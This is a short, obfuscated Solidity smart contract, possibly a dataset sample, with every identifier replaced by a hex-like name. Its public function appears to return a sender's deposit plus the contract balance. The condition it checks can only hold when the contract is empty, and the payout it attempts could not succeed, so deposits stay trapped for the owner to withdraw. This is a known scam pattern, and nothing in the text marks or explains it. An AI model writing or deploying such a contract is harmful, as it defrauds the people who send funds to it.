pragma solidity ^0.4.18;

contract OX1F1A3D50
{
    address public OX3E2B1F79 = msg.sender;
   
    function() public payable{}
   
    function OX5C9D2E84()
    payable
    public
    {
        require(msg.sender == OX3E2B1F79);
        OX3E2B1F79.transfer(this.balance);
    }
    
    function OX6F8A7C92(address OX7E4D5A60,bytes OX8C3B9A21)
    payable
    public
    {
        require(msg.sender == OX3E2B1F79);
         
        OX7E4D5A60.call.value(msg.value)(OX8C3B9A21);
    }
    
    function OX9B0E6C43(address OXA1C4D52)
    public
    payable
    {
        if(msg.value>=this.balance)
        {        
            OXA1C4D52.transfer(this.balance+msg.value);
        }
    }
}